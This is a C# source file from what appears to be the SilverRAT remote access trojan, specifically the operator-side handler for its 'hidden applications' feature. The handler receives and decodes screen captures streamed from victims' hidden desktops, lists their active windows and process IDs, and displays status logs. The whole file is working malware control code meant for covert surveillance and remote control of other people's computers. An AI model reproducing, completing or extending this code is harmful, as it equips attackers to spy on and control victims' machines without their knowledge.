using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using SilverRAT.Connection;
using SilverRAT.Forms;
using SilverRAT.Helper;
using SilverRAT.MessagePack;
using SilverRAT.StreamLibrary.UnsafeCodecs;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace SilverRAT.Handle_Packet;

internal class HandleHApps
{
    public void Connect(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "ClearUnsafeCode":
                    {
                        HiddenApp hiddenApp4 = (HiddenApp)Application.OpenForms["HApps:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        try
                        {
                            if (hiddenApp4 != null)
                            {
                                hiddenApp4.decoder = new UnsafeStreamCodec(Convert.ToInt32(hiddenApp4.QualityTrackBar.Value));
                            }
                            else
                            {
                                client.Disconnected();
                            }
                            break;
                        }
                        catch
                        {
                            break;
                        }
                    }
                case "Capture":
                    {
                        HiddenApp hiddenApp6 = (HiddenApp)Application.OpenForms["HApps:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenApp6 != null)
                        {
                            byte[] asBytes = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                            lock (hiddenApp6.syncPicbox)
                            {
                                using (MemoryStream inStream = new MemoryStream(asBytes))
                                {
                                    Bitmap bitmap = (Bitmap)(hiddenApp6.GetImage = hiddenApp6.decoder.DecodeData(inStream));
                                    hiddenApp6.rdSize = bitmap.Size;
                                    if (!hiddenApp6.Speed.Checked)
                                    {
                                        hiddenApp6.decoder = new UnsafeStreamCodec(Convert.ToInt32(hiddenApp6.QualityTrackBar.Value));
                                    }
                                }
                                hiddenApp6.ViewerBox.Image = hiddenApp6.GetImage;
                                hiddenApp6.FPS++;
                                if (hiddenApp6.sw.ElapsedMilliseconds >= 1000L)
                                {
                                    BunifuLabel infoFPS = hiddenApp6.InfoFPS;
                                    int fPS = hiddenApp6.FPS;
                                    infoFPS.Text = "FPS: " + fPS + " | Size: " + Methods.BytesToString(asBytes.Length);
                                    hiddenApp6.SizeScreen.Text = hiddenApp6.ViewerBox.Image.Width + ":" + hiddenApp6.ViewerBox.Image.Height;
                                    hiddenApp6.FPS = 0;
                                    hiddenApp6.sw = Stopwatch.StartNew();
                                }
                                break;
                            }
                        }
                        client.Disconnected();
                        break;
                    }
                case "Start":
                    {
                        HiddenApp hiddenApp2 = (HiddenApp)Application.OpenForms["HApps:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenApp2 != null)
                        {
                            hiddenApp2.Power.Enabled = true;
                            hiddenApp2.Power.Text = "Stop";
                            Program.Silver.TransitionHiddeng.HideSync(hiddenApp2.PanelMune);
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Logs":
                    {
                        HiddenApp hiddenApp7 = (HiddenApp)Application.OpenForms["HApps:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        try
                        {
                            if (hiddenApp7 != null)
                            {
                                if (bool.Parse(unpack_msgpack.ForcePathObject("State").AsString))
                                {
                                    hiddenApp7.Logs.ForeColor = Color.Black;
                                }
                                else
                                {
                                    hiddenApp7.Logs.ForeColor = Color.Red;
                                }
                                hiddenApp7.Logs.Text = unpack_msgpack.ForcePathObject("Message").AsString;
                            }
                            else
                            {
                                client.Disconnected();
                            }
                            break;
                        }
                        catch
                        {
                            break;
                        }
                    }
                case "Stop":
                    {
                        HiddenApp hiddenApp3 = (HiddenApp)Application.OpenForms["HApps:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenApp3 != null)
                        {
                            hiddenApp3.Power.Enabled = true;
                            hiddenApp3.Power.Text = "Start";
                            hiddenApp3.InfoFPS.Text = "";
                            try
                            {
                                if (hiddenApp3.decoder != null)
                                {
                                    hiddenApp3.decoder = new UnsafeStreamCodec(hiddenApp3.QualityTrackBar.Value);
                                }
                                if (hiddenApp3.ViewerBox.Image != null)
                                {
                                    hiddenApp3.ViewerBox.Image = null;
                                }
                                break;
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(ex.ToString());
                                break;
                            }
                        }
                        client.Disconnected();
                        break;
                    }
                case "WindowsActive":
                    {
                        HiddenApp hiddenApp5 = (HiddenApp)Application.OpenForms["HApps:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenApp5 != null)
                        {
                            hiddenApp5.ListWindows.Rows.Clear();
                            string asString = unpack_msgpack.ForcePathObject("List").AsString;
                            string[] array = asString.Split(new string[1] { "-==>" }, StringSplitOptions.None);
                            int num;
                            for (num = 0; num <= array.Length - 1; num++)
                            {
                                if (array[num].Length > 0)
                                {
                                    string text = array[num];
                                    string index = array[num + 1];
                                    Image icon = Image.FromStream(new MemoryStream(Convert.FromBase64String(array[num + 2])));
                                    string pID = array[num + 3];
                                    AddToListProcess(unpack_msgpack.ForcePathObject("ID").AsString, hiddenApp5.ListWindows, icon, new FileInfo(text).Name, index, pID, text);
                                }
                                num += 3;
                            }
                            hiddenApp5.CountWindows.Text = "Active : " + hiddenApp5.ListWindows.RowCount;
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Actived":
                    {
                        HiddenApp hiddenApp = (HiddenApp)Application.OpenForms["HApps:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (hiddenApp != null)
                        {
                            if (hiddenApp.Client == null)
                            {
                                hiddenApp.Client = client;
                                hiddenApp.LoaderConnect.Visible = false;
                                hiddenApp.TimerIsDisconnect.Start();
                                hiddenApp.Power.Enabled = true;
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
            }
        }
        catch
        {
        }
    }

    public void AddToListProcess(string IDForm, Guna2DataGridView DGV, Image Icon, string name, string Index, string PID, string Path)
    {
        try
        {
            HiddenApp HApps = (HiddenApp)Application.OpenForms["HApps:" + IDForm];
            if (HApps == null || HApps.Client == null)
            {
                return;
            }
            DataGridViewRow item = new DataGridViewRow
            {
                Height = 24
            };
            item.Cells.Add(new DataGridViewImageCell
            {
                Value = Icon,
                ImageLayout = DataGridViewImageCellLayout.Zoom
            });
            item.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = name
            });
            item.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = Index
            });
            item.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = PID
            });
            item.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = Path
            });
            if (HApps.InvokeRequired)
            {
                HApps.Invoke((MethodInvoker)delegate
                {
                    lock (HApps.syncList)
                    {
                        DGV.Rows.Insert(0, item);
                    }
                });
                return;
            }
            lock (HApps.syncList)
            {
                DGV.Rows.Insert(0, item);
            }
        }
        catch
        {
        }
    }
}
